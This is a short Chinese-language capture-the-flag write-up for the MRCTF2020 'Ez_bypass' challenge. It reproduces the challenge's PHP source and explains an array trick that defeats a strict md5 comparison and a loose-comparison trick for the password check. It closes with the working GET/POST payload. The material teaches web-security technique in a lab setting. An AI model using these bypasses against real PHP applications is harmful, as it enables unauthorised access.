# [MRCTF2020]Ez_bypass 1

- 开始代码审计

```php
<?php
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
//GET传参gg id
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    //md5()函数绕过
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        //POST传参passwd
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                //弱比较绕过
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
```

- 根据审计结果，需要以GET方式传入两个参数id和gg，且 `md5($id) === md5($gg) && $id !== $gg` ，此处使用数组绕过，接着需要以POST方式传入一个参数passwd，passwd不能为数字，且需要等于1234567，此处使用弱比较绕过，最终得到的payload为

`GET: ?id[]=1&gg[]=2`

`POST: passwd=1234567a`

> <img src="../../IMG2/Screenshot 2024-06-04 183155.png">